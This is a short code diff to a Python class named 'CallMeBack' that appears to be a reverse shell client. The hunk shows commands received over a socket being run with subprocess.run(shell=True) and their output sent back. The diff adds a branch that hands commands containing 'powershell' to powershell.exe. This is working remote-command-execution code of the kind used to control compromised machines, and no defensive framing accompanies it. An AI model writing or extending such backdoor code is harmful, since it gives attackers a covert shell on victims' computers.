@@ -58,7 +58,11 @@ class CallMeBack:
             if not data:
                 SendBack.cloes()
             try:
-                Data = subprocess.run(data,shell=True,capture_output=True)
+                if 'powershell' in data:
+                    Data = subprocess.run(["powershell.exe",data.split()[1] ], shell=True, capture_output=True)
+                else:
+                    Data = subprocess.run(data,shell=True,capture_output=True)
+                
                 if 'The system cannot find the path specified' in str(Data):
                     HandelPath = str("".join(data.split()[1:])) +' The system cannot find the path specified.'.replace('\n','')
                     SendBack.sendall(bytes(path.encode())), SendBack.sendall(HandelPath.encode()+'\n'.encode('latin-1'))
